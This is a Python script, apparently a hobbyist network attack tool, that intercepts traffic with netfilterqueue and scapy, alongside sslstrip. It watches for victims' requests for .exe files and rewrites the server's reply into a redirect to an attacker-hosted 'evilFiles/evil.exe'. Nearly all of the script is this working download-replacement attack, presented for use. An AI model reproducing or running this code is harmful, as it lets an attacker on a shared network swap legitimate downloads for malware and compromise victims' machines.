#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import argparse
import subprocess
import re
import sys

def getArgs():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="iface", help="The name of the interface you wish to use for this spoof (i.e. eth0, wlan0, etc.).  Use 'ifconfig' to find out which interface you should use.")
    args = parser.parse_args()
    if not args.iface:
        print("\nMust specify an interface.  Please type 'arpSpoof -h' for guidance on this utility.  Exiting program...\n")
        exit()
    else:
        return args
def getSelfIP():
    opt = getArgs()
    ifconfigresult = subprocess.check_output(["ifconfig", opt.iface])
    ipSearchResult = re.search(r"\d+\.\d+\.\d+\.\d+", str(ifconfigresult))
    if ipSearchResult:
        spoofIP = ipSearchResult.group(0)
        return spoofIP
    else:
        print("Could not obtain host IP.")
        exit()

ackList = []

def setLoad(pkt, load):
    pkt[scapy.Raw].load = load
    del pkt[scapy.IP].len
    del pkt[scapy.IP].chksum
    del pkt[scapy.TCP].chksum
    return pkt
def processPkt(pkt):
    scapyPkt = scapy.IP(pkt.get_payload())
    if scapyPkt.haslayer(scapy.Raw):
        #only works with sslstrip.  change value to 80 if using without of sslstrip
        if scapyPkt[scapy.TCP].dport == 10000:
            if ".exe" in scapyPkt[scapy.Raw].load and getSelfIP() not in scapyPkt[scapy.Raw].load:
                print("[+] exe Request")
                ackList.append(scapyPkt[scapy.TCP].ack)
        # only works with sslstrip.  change value to 80 if using without of sslstrip
        elif scapyPkt[scapy.TCP].sport == 10000:
            if scapyPkt[scapy.TCP].seq in ackList:
                print("[+] Replacing File for Known Connection: " + str(scapyPkt[scapy.TCP].seq))
                ackList.remove(scapyPkt[scapy.TCP].seq)
                modPacket = setLoad(scapyPkt, "HTTP/1.1 301 Moved Permanently\nLocation: http://"+getSelfIP()+"/evilFiles/evil.exe\n\n")
                pkt.set_payload(str(modPacket))
    pkt.accept()

while True:
    try:
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, processPkt)
        queue.run()
        break
    except AttributeError:
        print("\r[+] "+sys.stdout)
    except KeyboardInterrupt:
        print("\n[+] Ctrl+C Detected.  Exiting program...\n")
        exit()
